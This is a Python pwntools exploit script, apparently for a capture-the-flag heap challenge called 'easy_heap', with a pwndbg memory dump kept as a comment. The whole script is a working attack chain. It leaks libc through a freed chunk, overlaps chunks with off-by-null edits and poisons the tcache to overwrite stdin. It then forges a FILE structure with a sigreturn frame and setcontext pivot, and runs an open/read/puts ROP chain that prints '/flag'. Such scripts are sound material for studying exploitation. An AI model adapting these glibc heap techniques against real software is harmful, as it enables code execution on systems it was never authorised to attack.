#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')
 
# p = process(['setarch', 'x86_64', '-R', './easy_heap'])
p = process('./easy_heap')
libc = ELF('./libc.so')

def add(size):
  p.sendlineafter('Choice:', str(1))
  p.sendlineafter('Size: ', str(size))

def edit(idx, payload):
  p.sendlineafter('Choice:', str(2))
  p.sendlineafter('Index: ', str(idx))
  p.sendafter('Content: ', payload)

def delete(idx):
  p.sendlineafter('Choice:', str(3))
  p.sendlineafter('Index: ', str(idx))

def show(idx):
  p.sendlineafter('Choice:', str(4))
  p.sendlineafter('Index: ', str(idx))

if __name__ == "__main__":
  add(0x1000) # 0
  add(0x1000) # 1
  delete(0)
  add(0x1000) # 0
  show(0)
  libc.address = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x1ebbe0
  success('LIBC: ' + str(hex(libc.address)))
  delete(0)
  delete(1)

  for i in range(6):  # 0 - 5
    add(0x1000)
  add(0xbc0)  # 6
  for i in range(7):  # 7 - 13
    add(0x28)
  add(0xb20)  # 14
  add(0x10)   # 15 binary
  delete(14)
  add(0x1000) # 14
  add(0x28)  # 16 *
  payload = p64(0) + p64(0x521) + p8(0x40)
  edit(16, payload)

  add(0x28)  # 17
  add(0x28)  # 18
  add(0x28)  # 19
  add(0x28)  # 20

  for i in range(7):  # 7 - 13
    delete(7 + i )
  delete(19)
  delete(17)
  for i in range(7):  # 7 - 13
    add(0x28)
  add(0x400)  # 17
  add(0x28)   # 19
  payload = p64(0) + p8(0x20)
  edit(19, payload)
  add(0x28)   # 21

  for i in range(7):  # 7 - 13
    delete(7 + i )
  delete(18)
  delete(16)
  for i in range(7):  # 7 - 13
    add(0x28)

  add(0x28)   # 16
  payload = p8(0x20)
  edit(16, payload)
  add(0x28)   # 18

  add(0x28)   # 22
  add(0x5f8)  # 23
  add(0x100)  # 24 binary

  payload = 'a' * 0x20 + p64(0x520)
  edit(22, payload)
  delete(23)

  '''
  pwndbg> x/40gx 0x555555558400
  0x555555558460: 0x00005555555592a0      0x000055555555a2b0
  0x555555558470: 0x000055555555b2c0      0x000055555555c2d0
  0x555555558480: 0x000055555555d2e0      0x000055555555e2f0
  0x555555558490: 0x000055555555f300      0x000055555555fed0
  0x5555555584a0: 0x000055555555ff00      0x000055555555ff30
  0x5555555584b0: 0x000055555555ff60      0x000055555555ff90
  0x5555555584c0: 0x000055555555ffc0      0x000055555555fff0
  0x5555555584d0: 0x0000555555560b70      0x0000555555560b50
  0x5555555584e0: 0x0000555555560020      0x0000555555560110  # 17
  0x5555555584f0: 0x0000555555560080      0x0000555555560050
  0x555555558500: 0x00005555555600e0      0x00005555555600b0
  0x555555558510: 0x0000555555560520      0x0000000000000000  # 23
  0x555555558520: 0x0000555555561b80      0x0000000000000000
  0x555555558530: 0x0000000000000000      0x0000000000000000
  pwndbg> bins
  all: 0x555555560020 __ 0x7ffff7fb7be0 (main_arena+96) __ 0x555555560020 /* ' ' */
  '''

  __free_hook = libc.sym['__free_hook']
  __malloc_hook = libc.sym['__malloc_hook']
  stdin = libc.sym['_IO_2_1_stdin_']
  IO_str_jumps = libc.address + 0x1ed560
  setcontext = libc.sym['setcontext']
  open_ = libc.sym['open']
  read_ = libc.sym['read']
  write_ = libc.sym['write']
  puts_ = libc.sym['puts']
  pop_rdi_ret = 0x0000000000026b72 + libc.address
  pop_rsi_ret = 0x0000000000027529 + libc.address
  pop_rdx2ret = 0x00000000001626d6 + libc.address

  frame = SigreturnFrame()
  frame.rax = 0
  frame.rsp = __free_hook
  frame.rdi = 0
  frame.rsi = __free_hook
  frame.rdx = 0x2000
  frame.rip = read_

  rop = flat([
    pop_rdi_ret,
    __free_hook + 0xf8,
    p64(pop_rsi_ret),
    p64(0),
    open_,
    pop_rdi_ret,
    3,
    pop_rsi_ret,
    __free_hook + 0x200,
    pop_rdx2ret,
    0x100,
    0x100,
    read_,
    pop_rdi_ret,
    __free_hook + 0x200,
    puts_,
  ])
  rop = str(rop).ljust(0xf8, '\x00')
  rop += '/flag\x00\x00\x00'

  add(0xd0) # 23
  add(0x200) # 25 == 17
  add(0x200) # 26
  add(0xf0) # 27

  delete(26)
  delete(25)
  payload = p64(stdin)
  edit(17, payload)
  add(0x200) #25
  add(0x200) #26 == __free_hook

  IO = '\x00'*0x28
  IO += p64(stdin + 0xe0)
  IO = IO.ljust(0xD8,'\x00')
  IO += p64(IO_str_jumps)
  IO += str(frame)
  payload = IO + 'F' * 0x18 + p64(setcontext + 61)
  edit(26, payload)
  	
  gdb.attach(p)
  p.sendlineafter('Choice:','5')
  p.sendline(rop)

  p.interactive()